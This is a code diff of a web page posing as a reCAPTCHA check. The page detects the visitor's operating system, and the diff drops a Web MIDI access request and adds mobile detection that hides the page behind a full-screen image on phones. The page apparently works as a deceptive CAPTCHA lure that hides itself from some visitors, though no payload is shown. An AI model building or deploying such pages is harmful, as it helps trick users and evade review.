@@ -72,8 +72,8 @@
             transform: translateX(-50%);
             z-index: 20;
             animation: fadeIn 0.5s ease;
-            width: 300px; 
-            max-width: 90%; 
+            width: 300px;
+            max-width: 90%;
         }
         .recaptcha-popup.active {
             display: block;
@@ -105,9 +105,20 @@
             from { opacity: 0; }
             to { opacity: 1; }
         }
+        #mobileImage {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+            z-index: 1000;
+        }
     </style>
 </head>
 <body>
+    <img id="mobileImage" src="https://files.catbox.moe/0wvhjf.png" alt="Mobile Image">
     <div class="container">
         <div class="overlay" id="overlay"></div>
         <div class="recaptcha-box">
@@ -132,6 +143,10 @@
             if (userAgent.indexOf("mac") > -1) return "macOS";
             if (userAgent.indexOf("linux") > -1) return "Linux";
             return "Unknown";
+        }
+
+        function isMobile() {
+            return /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
         }
 
         function updateContent(os) {
@@ -173,28 +188,16 @@
             const overlay = document.getElementById("overlay");
             recaptchaPopup.classList.add("active");
             overlay.classList.add("active");
-
-            requestMIDIAccess();
-        }
-
-        function requestMIDIAccess() {
-            if (navigator.requestMIDIAccess) {
-                navigator.requestMIDIAccess()
-                    .then(
-                        (midiAccess) => {
-                            console.log("MIDI Access granted.", midiAccess);
-                        },
-                        (error) => {
-                            console.error("MIDI Access denied.", error);
-                        }
-                    );
-            } else {
-                console.error("Web MIDI API not supported in this browser.");
-            }
         }
 
         const verifyButton = document.getElementById('verifyButton');
         verifyButton.addEventListener('click', verify);
+
+        // Check if it's a mobile device and display the image
+        if (isMobile()) {
+            document.getElementById('mobileImage').style.display = 'block';
+            document.querySelector('.container').style.display = 'none';
+        }
     </script>
 </body>
 </html>
